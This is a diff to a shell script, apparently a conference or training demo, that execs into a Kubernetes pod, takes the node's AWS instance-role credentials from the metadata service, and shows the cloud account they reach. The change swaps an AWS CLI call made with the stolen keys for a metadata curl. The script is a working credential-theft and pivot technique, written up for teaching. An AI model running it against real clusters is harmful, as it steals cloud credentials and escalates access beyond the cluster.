@@ -46,9 +46,17 @@ kubectl --context "$CONTEXT" -n "$NS" exec "$POD_SELECTOR" -- sh -c '
   AKID_SHOWN=$(printf "%s" "$AKID" | cut -c1-8)
   echo "Stolen node credentials: AccessKeyId=${AKID_SHOWN}... a real, usable key for the node role."
   echo
-  echo "Who are we now? (aws sts get-caller-identity using the STOLEN node creds)"
-  AWS_ACCESS_KEY_ID="$AKID" AWS_SECRET_ACCESS_KEY="$SAK" AWS_SESSION_TOKEN="$TOK" \
-    aws sts get-caller-identity --query Arn --output text 2>&1
+  # Who are we now, and in which account? Read the node instance-identity document from IMDS (a GET,
+  # read-only) to name the account and region. We show the pivot this way, not by calling the aws CLI,
+  # because this minimal tool-pod image carries none: an aws call would only print "aws: not found" on
+  # stage. The identity document proves the same cloud-account reach using the stolen token.
+  DOC=$(curl -s -m 3 -H "$H" "$IMDS/latest/dynamic/instance-identity/document")
+  ACCT=$(printf "%s" "$DOC" | sed -n "s/.*\"accountId\" *: *\"\([^\"]*\)\".*/\1/p")
+  REGION=$(printf "%s" "$DOC" | sed -n "s/.*\"region\" *: *\"\([^\"]*\)\".*/\1/p")
+  echo "Who are we now? The stolen key is the node instance role ${ROLE},"
+  echo "   in AWS account ${ACCT}, region ${REGION} (from the node instance-identity document)."
   echo
-  echo "That ARN is a NODE ROLE. The blast radius just left the cluster (ASI03)."
+  echo "That is a NODE ROLE in a real AWS account. The blast radius just left the cluster (ASI03)."
+  # The stolen AKID/SAK/session token are a usable key for that role; we do not call AWS with them here.
+  : "${AKID:?} ${SAK:?} ${TOK:?}"
 '
